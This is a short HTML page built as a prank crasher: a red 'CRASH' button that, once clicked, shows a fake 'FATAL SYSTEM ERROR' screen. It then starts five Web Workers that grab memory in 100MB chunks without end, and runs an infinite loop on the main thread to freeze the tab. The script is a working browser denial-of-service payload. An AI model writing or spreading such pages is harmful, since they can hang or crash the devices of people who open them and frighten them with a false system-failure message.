<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>SYSTEM</title>
<style>
* { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Courier New', Courier, monospace; }
body {
    background: #000;
    color: #ff0033;
    display: flex;
    flex-direction: column;
    justify-content: center;
    align-items: center;
    height: 100vh;
    overflow: hidden;
}
h1 { font-size: 24px; margin-bottom: 50px; letter-spacing: 5px; text-shadow: 0 0 10px #ff0033; text-align: center; padding: 0 20px;}
#crash-btn {
    width: 250px;
    height: 250px;
    border-radius: 50%;
    background: radial-gradient(circle at 30% 30%, #ff4d4d, #990000);
    border: 8px solid #220000;
    box-shadow: 0 20px 50px rgba(255, 0, 51, 0.5), inset 0 -10px 20px rgba(0,0,0,0.8);
    color: #fff;
    font-size: 32px;
    font-weight: 900;
    cursor: pointer;
    transition: transform 0.1s, box-shadow 0.1s;
    text-shadow: 0 2px 4px rgba(0,0,0,0.8);
    outline: none;
}
#crash-btn:active {
    transform: scale(0.95) translateY(5px);
    box-shadow: 0 5px 20px rgba(255, 0, 51, 0.8), inset 0 -5px 10px rgba(0,0,0,0.8);
}
</style>
</head>
<body>

<h1>DO NOT PRESS THE BUTTON</h1>
<button id="crash-btn">CRASH</button>

<script>
document.getElementById('crash-btn').addEventListener('click', function() {
    
    // 1. Turn the screen solid red immediately
    document.body.style.background = '#ff0033';
    document.body.innerHTML = '<h1 style="font-size: 60px; color: black; text-shadow: none; text-align: center;">FATAL SYSTEM ERROR</h1>';

    // 2. Spawn 5 Web Workers to instantly eat all available RAM (OOM)
    try {
        const workerCode = `
            let a = [];
            while (true) {
                a.push(new ArrayBuffer(104857600)); // 100MB chunks
            }
        `;
        const blob = new Blob([workerCode], { type: 'application/javascript' });
        const workerURL = URL.createObjectURL(blob);
        
        // Spawn multiple workers to speed up the crash
        for(let i=0; i<5; i++) {
            new Worker(workerURL);
        }
    } catch(e) {}

    // 3. Infinite while loop on the MAIN thread to freeze the UI and drop FPS to 0
    setTimeout(() => {
        while (true) {
            // This will freeze the entire tab permanently
            document.body.innerHTML += ""; 
        }
    }, 100);
});
</script>

</body>
</html>
